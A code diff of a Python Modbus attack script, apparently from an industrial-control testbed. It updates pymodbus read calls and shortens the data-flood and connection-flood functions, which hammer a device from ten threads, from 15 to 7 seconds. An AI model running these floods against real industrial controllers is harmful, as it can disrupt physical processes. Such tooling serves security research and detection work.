@@ -202,10 +202,10 @@ def naive_sensor_read(ip_addresses):
 
         client = ModbusTcpClient(host=ip, port=502)
 
-        prev_coil = client.read_coils(0, 2000).bits
-        prev_di = client.read_discrete_inputs(0, 2000).bits
-        prev_ir = client.read_input_registers(0, 125).registers
-        prev_hr = client.read_holding_registers(0, 125).registers
+        prev_coil = client.read_coils(0, count=2000).bits
+        prev_di = client.read_discrete_inputs(0, count=2000).bits
+        prev_ir = client.read_input_registers(0, count=125).registers
+        prev_hr = client.read_holding_registers(0, count=125).registers
 
         coil_found = []
         di_found = []
@@ -214,10 +214,10 @@ def naive_sensor_read(ip_addresses):
 
         for _ in range(10):
             time.sleep(1)
-            coil = client.read_coils(0, 2000).bits
-            di = client.read_discrete_inputs(0, 2000).bits
-            ir = client.read_input_registers(0, 125).registers
-            hr = client.read_holding_registers(0, 125).registers
+            coil = client.read_coils(0, count=2000).bits
+            di = client.read_discrete_inputs(0, count=2000).bits
+            ir = client.read_input_registers(0, count=125).registers
+            hr = client.read_holding_registers(0, count=125).registers
 
             # compare previous response to current response
             for i in range(len(prev_coil)):
@@ -402,14 +402,14 @@ def data_flood_attack(ip_addresses):
                 client.read_input_registers(address=address, count=num_values)
 
     ip = random.choice(ip_addresses)
-    print(f"Flooding {ip} with random packets from 10 threads for 15 seconds")
+    print(f"Flooding {ip} with random packets from 10 threads for 7 seconds")
 
     stop_looping = Event()
     for _ in range(10):
         th_flooder = Thread(target=_flood, args=(ip, stop_looping))
         th_flooder.start()
 
-    time.sleep(15)
+    time.sleep(7)
     stop_looping.set()
 
     print("### DATA FLOOD ATTACK FINISH ###")
@@ -430,14 +430,14 @@ def connection_flood_attack(ip_addresses):
             client.close()
 
     ip = random.choice(ip_addresses)
-    print(f"Flooding {ip} with connection requests from 10 threads for 15 seconds")
+    print(f"Flooding {ip} with connection requests from 10 threads for 7 seconds")
 
     stop_looping = Event()
     for _ in range(10):
         th_flooder = Thread(target=_flood_connection, args=(ip, stop_looping))
         th_flooder.start()
 
-    time.sleep(15)
+    time.sleep(7)
     stop_looping.set()
 
     print("### CONNECTION FLOOD ATTACK FINISH ###")
